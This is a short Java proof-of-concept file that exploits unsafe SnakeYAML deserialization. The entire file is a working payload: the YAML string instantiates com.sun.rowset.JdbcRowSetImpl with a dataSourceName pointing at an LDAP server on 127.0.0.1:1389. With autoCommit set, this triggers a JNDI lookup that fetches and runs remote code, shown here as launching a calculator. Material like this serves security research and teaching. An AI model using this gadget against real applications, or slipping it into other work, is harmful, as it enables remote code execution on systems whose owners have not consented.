package jndi;

import org.yaml.snakeyaml.Yaml;

public class Demo {
    public static void main(String[] args) {
        Yaml yaml = new Yaml();
        yaml.load("!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:1389/Basic/Command/calc , autoCommit: true}");
    }
}
